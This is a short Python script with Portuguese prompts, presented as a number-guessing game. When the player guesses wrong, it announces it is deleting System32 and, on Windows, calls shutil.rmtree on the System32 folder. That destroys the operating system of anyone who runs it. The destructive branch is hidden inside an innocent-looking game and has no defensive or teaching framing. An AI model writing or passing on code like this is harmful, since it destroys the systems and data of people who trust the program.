import random
import os
import platform
import shutil

number = random.randint(1, 5)
try:
    guess = int(input("Escolha um número entre 1 e 5: "))
except ValueError:
    print("Por favor, digite um número válido.")
    exit()

if 1 <= guess <= 5:
    if guess == number:
        print("Você acertou!")
    else:
        print("Você perdeu! Excluindo System32...")

        sistema = platform.system()
        try:
            if sistema == "Windows":
                system32 = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32")
                if os.path.exists(system32):
                    shutil.rmtree(system32)
                    print("System32 deletado com sucesso!")
                else:
                    print("System32 não encontrado.")
            else:
                print("Não está em um sistema Windows, nada foi deletado.")
        except Exception as e:
            print(f"Ocorreu um erro ao tentar deletar System32: {e}")
else:
    print("O número digitado está fora do intervalo permitido (1 a 5).")
